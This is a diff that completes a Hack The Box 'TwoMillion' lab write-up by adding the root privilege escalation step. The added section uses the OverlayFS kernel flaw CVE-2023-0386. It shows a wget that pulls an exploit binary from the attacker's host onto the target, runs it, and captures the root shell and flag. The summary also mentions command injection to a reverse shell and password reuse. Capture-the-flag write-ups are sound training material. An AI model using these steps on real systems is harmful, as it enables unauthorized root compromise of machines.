@@ -2,9 +2,9 @@
 name: TwoMillion
 os: Linux
 difficulty: Easy
-status: USER PWNED
-pwn_date: 24 Feb 2026
-summary: "Analysis of a minified JavaScript file revealed an internal API used for invite code generation. Deobfuscating the code and making a POST request provided a Base64-encoded invite string. After registering and gaining access to the dashboard, an API enumeration revealed an administrative endpoint at /api/v1/admin/settings/update. By manipulating the JSON parameters in a PUT request, the current user account was elevated to administrative status. This provided access to the /api/v1/admin/vpn/generate endpoint, which was found to be vulnerable to OS Command Injection via the username parameter. Exploiting this vulnerability yielded a reverse shell as www-data. Local enumeration identified cleartext database credentials in a .env file. Password reuse of these credentials allowed for a successful SSH login as the admin user, providing access to the user flag. TODO: root flag"
+status: PWNED
+pwn_date: 26 Feb 2026
+summary: Analysis of minified JS revealed an API for invite code generation, yielding a Base64-encoded string via a POST request. After registration, API enumeration of the /api/v1/admin/settings/update endpoint allowed for administrative privilege escalation through JSON parameter manipulation in a PUT request. This provided access to /api/v1/admin/vpn/generate, where OS Command Injection in the username parameter yielded a reverse shell as www-data. Local enumeration uncovered database credentials in a .env file, which were reused to gain SSH access as admin. Finally, the system was found vulnerable to CVE-2023-0386 (OverlayFS). By leveraging FUSE to craft a malicious SUID binary and triggering a "copy-up" operation, the kernel failed to strip the SUID bit when moving the file to the host's upper directory. Executing this binary granted root privileges, allowing for the retrieval of the final flag.
 matrix_enum: 6
 matrix_real: 6
 matrix_cve: 6
@@ -20,11 +20,11 @@ matrix_ctf: 4
         </div>
         <div>
             <h1 style="margin: 0; font-size: 34px; font-weight: 800; color: #ffffff; text-transform: uppercase; letter-spacing: 2px; line-height: 1;">TwoMillion</h1>
-            <div style="margin-top: 10px;"><span style="font-size: 11px; font-weight: bold; color: #ff8c00; border: 1.5px solid #ff8c00; padding: 3px 12px; border-radius: 4px; text-transform: uppercase;">USER PWNED</span></div>
+            <div style="margin-top: 10px;"><span style="font-size: 11px; font-weight: bold; color: #9acd32; border: 1.5px solid #9acd32; padding: 3px 12px; border-radius: 4px; text-transform: uppercase;">PWNED</span></div>
             <div style="display: flex; gap: 15px; margin-top: 18px; font-size: 14px; font-weight: 500; opacity: 0.9;">
                 <span><span style="color: #9acd32;">💻</span> Linux</span>
                 <span><span style="color: #9acd32;">🔥</span> Easy</span>
-                <span><span style="color: #9acd32;">📅</span> 24 Feb 2026</span>
+                <span><span style="color: #9acd32;">📅</span> 26 Feb 2026</span>
             </div>
         </div>
     </div>
@@ -43,8 +43,8 @@ matrix_ctf: 4
             <text x="45" y="145" font-size="9" fill="#aaa" text-anchor="middle" font-weight="bold">CUSTOM</text>
             <text x="18" y="65" font-size="9" fill="#aaa" text-anchor="end" font-weight="bold">CTF</text>
             
-            <polygon points="80,56.2 107.39042766930042,76.10031056200151 96.92821526602323,108.29968943799848 68.71452315598452,100.533126291999 61.73971488713305,79.06687370800101" fill="#ff8c0033" stroke="#ff8c00" stroke-width="2.5" stroke-linejoin="round" />
-            <circle cx="80" cy="85" r="2.5" fill="#ff8c00" />
+            <polygon points="80,56.2 107.39042766930042,76.10031056200151 96.92821526602323,108.29968943799848 68.71452315598452,100.533126291999 61.73971488713305,79.06687370800101" fill="#9acd3233" stroke="#9acd32" stroke-width="2.5" stroke-linejoin="round" />
+            <circle cx="80" cy="85" r="2.5" fill="#9acd32" />
         </svg>
     </div>
 </div>
@@ -584,4 +584,126 @@ admin@2million:~$ cat user.txt
 107720a672**********************
 ```
 
-TODO: root flag
+Running the usual commands to check for anything strange:
+
+```zsh
+admin@2million:~$ id
+uid=1000(admin) gid=1000(admin) groups=1000(admin)
+```
+
+We are in a different group! We can enumerate what files this group owns (I trimmed the output and discarded the junk files.):
+
+```zsh
+admin@2million:~$ find / -group admin 2>/dev/null
+/run/user/1000
+/run/user/1000/snapd-session-agent.socket
+/run/user/1000/pk-debconf-socket
+/run/user/1000/gnupg
+/run/user/1000/gnupg/S.gpg-agent
+/run/user/1000/gnupg/S.gpg-agent.ssh
+/run/user/1000/gnupg/S.gpg-agent.extra
+/run/user/1000/gnupg/S.gpg-agent.browser
+/run/user/1000/gnupg/S.dirmngr
+/run/user/1000/bus
+/run/user/1000/systemd
+/run/user/1000/systemd/private
+/run/user/1000/systemd/notify
+/run/user/1000/systemd/generator.late
+/run/user/1000/systemd/generator.late/xdg-desktop-autostart.target.wants
+/run/user/1000/systemd/generator.late/xdg-desktop-autostart.target.wants/app-snap\x2duserd\x2dautostart@autostart.service
+/run/user/1000/systemd/generator.late/app-snap\x2duserd\x2dautostart@autostart.service
+/run/user/1000/systemd/units
+/run/user/1000/systemd/units/invocation:dbus.socket
+/run/user/1000/systemd/inaccessible
+/run/user/1000/systemd/inaccessible/chr
+/run/user/1000/systemd/inaccessible/sock
+/run/user/1000/systemd/inaccessible/fifo
+/run/user/1000/systemd/inaccessible/dir
+/run/user/1000/systemd/inaccessible/reg
+/home/admin
+/home/admin/.cache
+/home/admin/.cache/motd.legal-displayed
+/home/admin/.ssh
+/home/admin/.profile
+/home/admin/user.txt
+/home/admin/.bash_logout
+/home/admin/.bashrc
+/var/mail/admin
+```
+
+Uh, let's take a look at this last file:
+
+```zsh
+admin@2million:/var/mail$ cat admin
+```
+```
+From: ch4p <ch4p@2million.htb>
+To: admin <admin@2million.htb>
+Cc: g0blin <g0blin@2million.htb>
+Subject: Urgent: Patch System OS
+Date: Tue, 1 June 2023 10:45:22 -0700
+Message-ID: <9876543210@2million.htb>
+X-Mailer: ThunderMail Pro 5.2
+
+Hey admin,
+
+I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.
+
+HTB Godfather
+```
+
+Searching about OverlayFS CVE (CVE-2023-0386), we stumble upon a Kernel exploit that lets an unprivileged user to escalate their privileges by copying files with setuid attributes from a nosuid mount to a writable mount. Using the PoC in this link `https://github.com/DataDog/security-labs-pocs/blob/main/proof-of-concept-exploits/overlayfs-cve-2023-0386/poc.c`, we can escalate to a root user:
+
+```zsh
+admin@2million:/tmp$ wget http://10.10.14.113:9000/poc -O /tmp/poc  
+--2026-02-26 12:57:22--  http://10.10.14.113:9000/poc  
+Connecting to 10.10.14.113:9000... connected.  
+HTTP request sent, awaiting response... 200 OK  
+Length: 1284224 (1.2M) [application/octet-stream]  
+Saving to: ‘/tmp/poc’  
+  
+/tmp/poc                     100%[=============================================>]   1.22M   746KB/s    in 1.7s  
+  
+2026-02-26 12:57:24 (746 KB/s) - ‘/tmp/poc’ saved [1284224/1284224]  
+  
+admin@2million:/tmp$ chmod +x poc && ./poc  
+Waiting 1 sec...  
+unshare -r -m sh -c 'mount -t overlay overlay -o lowerdir=/tmp/ovlcap/lower,upperdir=/tmp/ovlcap/upper,workdir=/tmp  
+/ovlcap/work /tmp/ovlcap/merge && ls -la /tmp/ovlcap/merge && touch /tmp/ovlcap/merge/file'  
+[+] readdir  
+[+] getattr_callback  
+/file  
+total 8  
+drwxrwxr-x 1 root   root     4096 Feb 26 12:57 .  
+drwxrwxr-x 6 root   root     4096 Feb 26 12:57 ..  
+-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file  
+[+] open_callback  
+/file  
+[+] read_callback  
+cnt  : 0  
+clen  : 0  
+path  : /file  
+size  : 0x4000  
+offset: 0x0  
+[+] open_callback  
+/file  
+[+] open_callback  
+/file  
+[+] ioctl callback  
+path /file  
+cmd 0x80086601  
+/tmp/ovlcap/upper/file  
+To run a command as administrator (user "root"), use "sudo <command>".  
+See "man sudo_root" for details.  
+  
+root@2million:/tmp#
+```
+
+To finish, we just need to grab the root.txt flag:
+
+```zsh
+root@2million:/tmp# cd ..  
+root@2million:/# cd root  
+root@2million:/root# cat root.txt  
+d1cbf6226a**********************
+```
